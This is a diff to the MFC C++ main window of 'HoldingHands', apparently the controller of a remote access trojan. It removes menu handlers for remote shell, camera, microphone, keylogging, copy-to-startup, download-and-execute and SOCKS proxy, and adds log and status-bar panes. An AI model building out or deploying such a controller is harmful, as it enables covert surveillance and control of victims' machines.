@@ -47,9 +47,9 @@
 
 // CMainFrame
 
-IMPLEMENT_DYNAMIC(CMainFrame, CFrameWnd)
+IMPLEMENT_DYNCREATE(CMainFrame, CFrameWndEx)
 
-BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
+BEGIN_MESSAGE_MAP(CMainFrame, CFrameWndEx)
 	ON_WM_CREATE()
 	ON_WM_SETFOCUS()
 	ON_WM_PAINT()
@@ -66,33 +66,18 @@ BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
 	//ON_MESSAGE()
 	ON_WM_CLOSE()
 	ON_COMMAND(ID_MAIN_EXIT, &CMainFrame::OnMainExit)
-	//不在MainFrame里面加始终是灰色的.
-	ON_COMMAND(ID_SESSION_DISCONNECT, &CMainFrame::OnSessionDisconnect)
-	ON_COMMAND(ID_SESSION_UNINSTALL, &CMainFrame::OnSessionUninstall)
-	ON_COMMAND(ID_POWER_SHUTDOWN, &CMainFrame::OnPowerShutdown)
-	ON_COMMAND(ID_POWER_REBOOT, &CMainFrame::OnPowerReboot)
-	ON_COMMAND(ID_OPERATION_EDITCOMMENT, &CMainFrame::OnOperationEditcomment)
+
 	ON_UPDATE_COMMAND_UI(ID_MAIN_EXIT, &CMainFrame::OnUpdateMainExit)
-	ON_COMMAND(ID_OPERATION_CMD, &CMainFrame::OnOperationCmd)
-	ON_COMMAND(ID_OPERATION_CHATBOX, &CMainFrame::OnOperationChatbox)
-	ON_COMMAND(ID_OPERATION_FILEMANAGER, &CMainFrame::OnOperationFilemanager)
-	ON_COMMAND(ID_OPERATION_REMOTEDESKTOP, &CMainFrame::OnOperationRemotedesktop)
-	ON_COMMAND(ID_OPERATION_CAMERA, &CMainFrame::OnOperationCamera)
-	ON_COMMAND(ID_SESSION_RESTART, &CMainFrame::OnSessionRestart)
-	ON_COMMAND(ID_OPERATION_MICROPHONE, &CMainFrame::OnOperationMicrophone)
+
 	ON_COMMAND(ID_MAIN_BUILD, &CMainFrame::OnMainBuild)
 	ON_COMMAND(ID_MAIN_SETTINGS, &CMainFrame::OnMainSettings)
-	ON_COMMAND(ID_OPERATION_KEYBOARD, &CMainFrame::OnOperationKeyboard)
-	ON_COMMAND(ID_UTILS_ADDTO, &CMainFrame::OnUtilsAddto)
-	ON_COMMAND(ID_UTILS_COPYTOSTARTUP, &CMainFrame::OnUtilsCopytostartup)
-	ON_COMMAND(ID_UTILS_DOWNLOADANDEXEC, &CMainFrame::OnUtilsDownloadandexec)
-	ON_COMMAND(ID_PROXY_SOCKSPROXY, &CMainFrame::OnProxySocksproxy)
-	ON_COMMAND(ID_SESSION_EXIT, &CMainFrame::OnSessionExit)
-	ON_COMMAND(ID_UTILS_OPENWEBPAGE, &CMainFrame::OnUtilsOpenwebpage)
+	
 	ON_WM_SIZE()
-	ON_COMMAND(ID_OPERATION_PROCESSMANAGER, &CMainFrame::OnOperationProcessmanager)
-	ON_COMMAND(ID_REMOTEDESKTOP_DXGI, &CMainFrame::OnRemotedesktopDxgi)
-	ON_COMMAND(ID_REMOTEDESKTOP_GDI, &CMainFrame::OnRemotedesktopGdi)
+
+	ON_UPDATE_COMMAND_UI(ID_VIEW_LOGVIEW, &CMainFrame::OnUpdateViewLogview)
+	ON_UPDATE_COMMAND_UI(ID_VIEW_STATUSBAR, &CMainFrame::OnUpdateViewStatusbar)
+	ON_COMMAND(ID_VIEW_LOGVIEW, &CMainFrame::OnViewLogview)
+	ON_COMMAND(ID_VIEW_STATUSBAR, &CMainFrame::OnViewStatusbar)
 END_MESSAGE_MAP()
 
 TCHAR * szSrvStatu[] =
@@ -116,7 +101,7 @@ static UINT indicators[] =
 
 // CMainFrame 构造/析构
 
-CMainFrame::CMainFrame(CIOCP *Iocp)
+CMainFrame::CMainFrame()
 {
 	TCHAR szPath[MAX_PATH];
 
@@ -126,17 +111,14 @@ CMainFrame::CMainFrame(CIOCP *Iocp)
 	//
 
 	m_pServer = NULL;
-	m_Iocp = Iocp;
+	m_Iocp = ((CHoldingHandsApp*)AfxGetApp())->GetIocp();
 	//
 	GetProcessDirectory(szPath);
 
 	CString strPath(szPath);
 	strPath += TEXT("\\config\\config.json");
 
-	if (!m_config.LoadConfig(strPath))
-	{
-		m_config.DefaultConfig();
-	}
+	ASSERT(m_config.LoadConfig(strPath));
 }
 
 CMainFrame::~CMainFrame()
@@ -202,30 +184,45 @@ int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
 {
 	RECT rect = { 0 };
 
-	if (CFrameWnd::OnCreate(lpCreateStruct) == -1)
+	if (CFrameWndEx::OnCreate(lpCreateStruct) == -1)
 		return -1;
 	
 	//创建状态栏
-	if (!m_wndStatusBar.Create(this)){
+	if (!m_wndStatusBar.Create(this))
+	{
 		TRACE0("未能创建StatuBar\n");
 		return -1;      // 未能创建
 	}
+
 	m_wndStatusBar.SetIndicators(indicators, sizeof(indicators) / sizeof(UINT));
-	m_wndStatusBar.SetPaneInfo(0, ID_SERVER_STATU, SBPS_STRETCH, 0);
+	m_wndStatusBar.SetPaneInfo(0, ID_SERVER_STATU, SBPS_STRETCH, 100);
 	m_wndStatusBar.SetPaneInfo(1, ID_HOST_COUNT, SBPS_NORMAL, 110);
 	m_wndStatusBar.SetPaneInfo(2, ID_HOST_SELECTED, SBPS_NORMAL, 110);
 	m_wndStatusBar.SetPaneInfo(3, ID_UPLOAD_SPEED, SBPS_NORMAL, 180);
 	m_wndStatusBar.SetPaneInfo(4, ID_DOWNLOAD_SPEED, SBPS_NORMAL, 180);
 	m_wndStatusBar.SetPaneInfo(5, ID_CUR_DATE, SBPS_NORMAL, 160);
 
-	if (!m_ClientList.Create(WS_CHILD | WS_VISIBLE | WS_BORDER | LVS_REPORT,
-		rect, this, NULL))
+	EnableDocking(CBRS_ALIGN_ANY);
+
+	//创建输出窗口
+	if (!m_wndOutput.Create(
+		TEXT(""),
+		this,
+		CRect(0, 0, 100, 100),
+		FALSE,
+		40000,
+		WS_CHILD | WS_VISIBLE | WS_CLIPSIBLINGS | WS_CLIPCHILDREN | CBRS_BOTTOM | CBRS_FLOAT_MULTI))
 	{
-		TRACE0("未能创建ClientList\n");
-		return -1;      // 未能创建
+		TRACE0("未能创建输出窗口\n");
+		return FALSE; // 未能创建
 	}
 
-	m_View |= (VIEW_SHOW_CLIENLIST);
+	m_wndOutput.EnableDocking(CBRS_ALIGN_ANY);
+	DockPane(&m_wndOutput);
+	m_wndOutput.SetControlBarStyle(AFX_CBRS_RESIZE | AFX_CBRS_CLOSE);
+
+	m_View |= (VIEW_SHOW_LOG | VIEW_SHOW_STATUS_BAR);
+
 	m_ServerStatu = SRV_STATU_STOPPED;
 
 	//用于刷新数据的计时器
@@ -236,6 +233,10 @@ int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
 
 	CenterWindow(CWnd::GetDesktopWindow());
 
+	// 设置用于绘制所有用户界面元素的视觉管理器
+	CMFCVisualManager::SetDefaultManager(RUNTIME_CLASS(CMFCVisualManagerVS2008));
+
+	GetLogCtrl()->Log(TEXT("Welcome to HoldingHands"));
 	/*
 	LPVOID * Args = new LPVOID [2];
 
@@ -248,14 +249,16 @@ int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
 
 BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
 {
-	if( !CFrameWnd::PreCreateWindow(cs) )
+	if (!CFrameWndEx::PreCreateWindow(cs))
 		return FALSE;
 	// TODO:  在此处通过修改
 	//  CREATESTRUCT cs 来修改窗口类或样式
 
+	cs.style &= ~FWS_ADDTOTITLE;
 	cs.style |= (CS_HREDRAW | CS_VREDRAW);
 	cs.dwExStyle &= ~WS_EX_CLIENTEDGE;
 	cs.lpszClass = AfxRegisterWndClass(0);
+	
 	cs.lpszName = TEXT("[HoldingHands]");
 	
 	return TRUE;
@@ -266,12 +269,12 @@ BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
 #ifdef _DEBUG
 void CMainFrame::AssertValid() const
 {
-	CFrameWnd::AssertValid();
+	CFrameWndEx::AssertValid();
 }
 
 void CMainFrame::Dump(CDumpContext& dc) const
 {
-	CFrameWnd::Dump(dc);
+	CFrameWndEx::Dump(dc);
 }
 #endif //_DEBUG
 
@@ -285,10 +288,7 @@ void CMainFrame::OnSetFocus(CWnd* /*pOldWnd*/)
 
 void CMainFrame::OnPaint()
 {
-	CPaintDC dc(this); // device context for painting
-	// TODO:  在此处添加消息处理程序代码
-	// 不为绘图消息调用 CFrameWnd::OnPaint()
-	
+	CPaintDC(this);
 }
 
 
@@ -302,7 +302,6 @@ void CMainFrame::OnUpdateStatuBar()
 
 	LARGE_INTEGER tmp[2];
 	
-
 	TCHAR szReadSpeed[128], szWriteSpeed[128];
 
 	PaneText = time.Format("[%Y-%m-%d %H:%M:%S]");
@@ -327,18 +326,8 @@ void CMainFrame::OnUpdateStatuBar()
 
 	PaneText.Format(TEXT("Download: %s/s"), szReadSpeed);
 	m_wndStatusBar.SetPaneText(4, PaneText);
-
-	//HostCount
-	PaneText.Format(TEXT("Host: %d"), m_ClientList.GetItemCount());
-	m_wndStatusBar.SetPaneText(1, PaneText);
-	//Selected Count
-	PaneText.Format(TEXT("Selected: %d"), m_ClientList.GetSelectedCount());
-	m_wndStatusBar.SetPaneText(2, PaneText);
-	//ServerStatu
-
-	PaneText.Format(TEXT("ServerStatu: %s"), szSrvStatu[m_ServerStatu]);
-	m_wndStatusBar.SetPaneText(0, PaneText);
 }
+
 void CMainFrame::OnTimer(UINT_PTR nIDEvent)
 {
 	// TODO:  在此添加消息处理程序代码和/或调用默认值
@@ -351,7 +340,7 @@ void CMainFrame::OnTimer(UINT_PTR nIDEvent)
 	default:
 		break;
 	}
-	CFrameWnd::OnTimer(nIDEvent);
+	CFrameWndEx::OnTimer(nIDEvent);
 }
 
 /*
@@ -360,69 +349,68 @@ void CMainFrame::OnTimer(UINT_PTR nIDEvent)
 
 void CMainFrame::OnMainStartserver()
 {
-	// TODO:  在此添加命令处理程序代码
-	if (m_ServerStatu == SRV_STATU_STARTED){
-		if (m_pServer)
-		{
-			m_pServer->Close();
-			m_pServer->Put();
-			m_pServer = NULL;
-		}
-		m_ServerStatu = SRV_STATU_STOPPED;
+	CString PaneText;
 
-		//移除所有客户端
-		//m_ClientList.DeleteAllItems();
-		return;
-	}
-
-	if (m_ServerStatu == SRV_STATU_STOPPED)
+	do
 	{
-		m_ServerStatu = SRV_STATU_STARTING;
-		m_pServer = new CServer;
+		if (m_ServerStatu == SRV_STATU_STARTED)
+			break;
+		//
 
-		if (!m_pServer->Create())
+		if (m_ServerStatu == SRV_STATU_STOPPED)
 		{
-			MessageBox(TEXT("Create Server failed"), TEXT("Error"), MB_OK);
-			m_pServer->Close();
-			m_pServer->Put();
-			m_pServer = NULL;
-			return;
-		}
+			//set server status.
+			m_ServerStatu = SRV_STATU_STARTING;
+			PaneText.Format(TEXT("ServerStatus: %s"), szSrvStatu[m_ServerStatu]);
+			m_wndStatusBar.SetPaneText(0, PaneText);
 
-		if (!m_pServer->Bind(10086, "0.0.0.0"))
-		{
-			MessageBox(TEXT("Bind failed"), TEXT("Error"), MB_OK);
-			m_pServer->Close();
-			m_pServer->Put();
-			m_pServer = NULL;
-			return;
-		}
+			m_pServer = new CServer;
 
-		if (!m_pServer->Listen(1024))
-		{
-			MessageBox(TEXT("Listen failed"), TEXT("Error"), MB_OK);
-			m_pServer->Close();
-			m_pServer->Put();
-			m_pServer = NULL;
-			return;
-		}
-		
-		if (!m_Iocp->AssociateSock(m_pServer))
-		{
-			MessageBox(TEXT("AssociateSock failed"), TEXT("Error"), MB_OK);
-			m_pServer->Close();
-			m_pServer->Put();
-			m_pServer = NULL;
-			return;
-		}
+			if (!m_pServer->Create())
+			{
+				MessageBox(TEXT("Create Server failed"), TEXT("Error"), MB_OK);
+				break;
+			}
 
-		//begin accept.
-		m_pServer->SetNotifyWindow(m_hWnd);
-		m_pServer->Accept(NULL);
+			if (!m_pServer->Bind(10086, "0.0.0.0"))
+			{
+				MessageBox(TEXT("Bind failed"), TEXT("Error"), MB_OK);
+				break;
+			}
 
-		m_ServerStatu = SRV_STATU_STARTED;
-		MessageBox(TEXT("Start server successed!"), TEXT("Tips"),MB_OK);
-	}
+			if (!m_pServer->Listen(1024))
+			{
+				MessageBox(TEXT("Listen failed"), TEXT("Error"), MB_OK);
+				break;
+			}
+
+			if (!m_Iocp->AssociateSock(m_pServer))
+			{
+				MessageBox(TEXT("AssociateSock failed"), TEXT("Error"), MB_OK);
+				break;
+			}
+
+			//begin accept.
+			m_pServer->SetNotifyWindow(m_hWnd);
+			m_pServer->Accept(NULL);
+
+			m_ServerStatu = SRV_STATU_STARTED;
+			PaneText.Format(TEXT("ServerStatus: %s"), szSrvStatu[m_ServerStatu]);
+			m_wndStatusBar.SetPaneText(0, PaneText);
+
+			MessageBox(TEXT("Start server successed!"), TEXT("Tips"), MB_OK);
+		}
+		return;
+	} while (0);
+
+failed:
+	m_pServer->Close();
+	m_pServer->Put();
+	m_pServer = NULL;
+
+	m_ServerStatu = SRV_STATU_STOPPED;
+	PaneText.Format(TEXT("ServerStatus: %s"), szSrvStatu[m_ServerStatu]);
+	m_wndStatusBar.SetPaneText(0, PaneText);
 }
 
 
@@ -474,7 +462,7 @@ void CMainFrame::OnClose()
 	KillTimer(10086);
 	m_ServerStatu = SRV_STATU_STOPPED;
 
-	CFrameWnd::OnClose();
+	CFrameWndEx::OnClose();
 }
 
 
@@ -486,7 +474,7 @@ LRESULT CMainFrame::OnClientLogin(WPARAM wParam, LPARAM module)
 	switch (module)
 	{
 	case KNEL:
-		pHandler->SetNotifyWindow(m_ClientList.GetSafeHwnd());
+		pHandler->SetNotifyWindow(GetActiveView()->GetSafeHwnd());
 		pHandler->Get();
 		break;
 	case MINIFILETRANS:
@@ -576,27 +564,22 @@ LRESULT CMainFrame::OnClientLogin(WPARAM wParam, LPARAM module)
 	return 0;
 }
 
+void CMainFrame::OnMainBuild(){
+	CBuildDlg dlg;
+	dlg.DoModal();
+}
 
-//不在MainFrame里面加消息映射,菜单始终是灰色的mmp.
-void CMainFrame::OnSessionDisconnect()
-{
-	m_ClientList.SendMessage(WM_COMMAND, ID_SESSION_DISCONNECT);
+
+void CMainFrame::OnMainSettings(){
+	CSettingDlg dlg(m_config, this);
+	dlg.DoModal();
 }
-void CMainFrame::OnSessionUninstall()
+
+void CMainFrame::OnSize(UINT nType, int cx, int cy)
 {
-	m_ClientList.SendMessage(WM_COMMAND, ID_SESSION_UNINSTALL);
-}
-void CMainFrame::OnPowerShutdown()
-{
-	m_ClientList.SendMessage(WM_COMMAND, ID_POWER_SHUTDOWN);
-}
-void CMainFrame::OnPowerReboot()
-{
-	m_ClientList.SendMessage(WM_COMMAND, ID_POWER_REBOOT);
-}
-void CMainFrame::OnOperationEditcomment()
-{
-	m_ClientList.SendMessage(WM_COMMAND, ID_OPERATION_EDITCOMMENT);
+	//RecalcLayout();
+	//RedrawWindow();
+	CFrameWndEx::OnSize(nType, cx, cy);
 }
 
 void CMainFrame::OnUpdateMainExit(CCmdUI *pCmdUI)
@@ -606,136 +589,55 @@ void CMainFrame::OnUpdateMainExit(CCmdUI *pCmdUI)
 }
 
 
-void CMainFrame::OnOperationCmd()
+void CMainFrame::OnUpdateViewLogview(CCmdUI *pCmdUI)
 {
-	// TODO:  在此添加命令处理程序代码
-	m_ClientList.SendMessage(WM_COMMAND, ID_OPERATION_CMD);
+	int check = 0;
+	if (m_View & VIEW_SHOW_LOG)
+		check = 1;
+
+	pCmdUI->SetCheck(check);
 }
 
 
-void CMainFrame::OnOperationChatbox()
+void CMainFrame::OnUpdateViewStatusbar(CCmdUI *pCmdUI)
 {
-	// TODO:  在此添加命令处理程序代码
-	m_ClientList.SendMessage(WM_COMMAND, ID_OPERATION_CHATBOX);
+	int check = 0;
+	if (m_View & VIEW_SHOW_STATUS_BAR)
+		check = 1;
+
+	pCmdUI->SetCheck(check);
 }
 
-void CMainFrame::OnOperationFilemanager()
+
+void CMainFrame::OnViewLogview()
 {
-	// TODO:  在此添加命令处理程序代码
-	m_ClientList.SendMessage(WM_COMMAND, ID_OPERATION_FILEMANAGER);
+	if (m_View & VIEW_SHOW_LOG)
+	{
+		ShowPane(&m_wndOutput, FALSE, FALSE, FALSE);
+		m_View &= (~VIEW_SHOW_LOG);
+	}
+	else
+	{
+		ShowPane(&m_wndOutput, TRUE, FALSE, FALSE);
+		m_View |= (VIEW_SHOW_LOG);
+	}
+	RecalcLayout();
+	RedrawWindow();
 }
 
 
-void CMainFrame::OnOperationRemotedesktop()
+void CMainFrame::OnViewStatusbar()
 {
-	m_ClientList.SendMessage(WM_COMMAND, ID_OPERATION_REMOTEDESKTOP);
-}
-
-
-void CMainFrame::OnOperationCamera()
-{
-	m_ClientList.SendMessage(WM_COMMAND, ID_OPERATION_CAMERA);
-}
-
-
-void CMainFrame::OnSessionRestart()
-{
-	// TODO:  在此添加命令处理程序代码
-	m_ClientList.SendMessage(WM_COMMAND, ID_SESSION_RESTART);
-}
-
-
-void CMainFrame::OnOperationMicrophone()
-{
-	m_ClientList.SendMessage(WM_COMMAND, ID_OPERATION_MICROPHONE);
-}
-
-
-
-void CMainFrame::OnMainBuild(){
-	CBuildDlg dlg;
-	dlg.DoModal();
-}
-
-
-void CMainFrame::OnMainSettings(){
-	CSettingDlg dlg(m_config,this);
-	dlg.DoModal();
-}
-
-
-void CMainFrame::OnOperationKeyboard()
-{
-	m_ClientList.SendMessage(WM_COMMAND, ID_OPERATION_KEYBOARD, 0);
-}
-
-
-void CMainFrame::OnUtilsAddto()
-{
-	m_ClientList.SendMessage(WM_COMMAND, ID_UTILS_ADDTO, 0);
-}
-
-
-void CMainFrame::OnUtilsCopytostartup()
-{
-	m_ClientList.SendMessage(WM_COMMAND, ID_UTILS_COPYTOSTARTUP, 0);
-}
-
-
-void CMainFrame::OnUtilsDownloadandexec()
-{
-	m_ClientList.SendMessage(WM_COMMAND, ID_UTILS_DOWNLOADANDEXEC, 0);
-}
-
-
-void CMainFrame::OnProxySocksproxy()
-{
-	m_ClientList.SendMessage(WM_COMMAND, ID_PROXY_SOCKSPROXY, 0);
-}
-
-
-void CMainFrame::OnSessionExit()
-{
-	m_ClientList.SendMessage(WM_COMMAND, ID_SESSION_EXIT, 0);
-}
-
-
-void CMainFrame::OnUtilsOpenwebpage()
-{
-	m_ClientList.SendMessage(WM_COMMAND, ID_UTILS_OPENWEBPAGE, 0);
-}
-
-
-void CMainFrame::OnSize(UINT nType, int cx, int cy)
-{
-	CFrameWnd::OnSize(nType, cx, cy);
-
-	RECT rect;
-	RECT StatuBarRect;
-	//
-	m_wndStatusBar.GetClientRect(&StatuBarRect);
-	GetClientRect(&rect);
-	rect.bottom -= (StatuBarRect.bottom - StatuBarRect.top);
-	m_ClientList.MoveWindow(&rect);
-	m_ClientList.ShowWindow(SW_SHOW);
-	// TODO:  在此处添加消息处理程序代码
-}
-
-
-
-void CMainFrame::OnOperationProcessmanager()
-{
-	m_ClientList.SendMessage(WM_COMMAND, ID_OPERATION_PROCESSMANAGER);
-}
-
-
-void CMainFrame::OnRemotedesktopDxgi()
-{
-	m_ClientList.SendMessage(WM_COMMAND, ID_REMOTEDESKTOP_DXGI);
-}
-
-
-void CMainFrame::OnRemotedesktopGdi()
-{
-	m_ClientList.SendMessage(WM_COMMAND, ID_REMOTEDESKTOP_GDI);
+	if (m_View & VIEW_SHOW_STATUS_BAR)
+	{
+		m_View &= (~VIEW_SHOW_STATUS_BAR);
+		m_wndStatusBar.ModifyStyle(WS_VISIBLE,0);
+	}
+	else
+	{
+		m_View |= (VIEW_SHOW_STATUS_BAR);
+		m_wndStatusBar.ModifyStyle(0, WS_VISIBLE);
+	}
+	RecalcLayout();
+	RedrawWindow();
 }
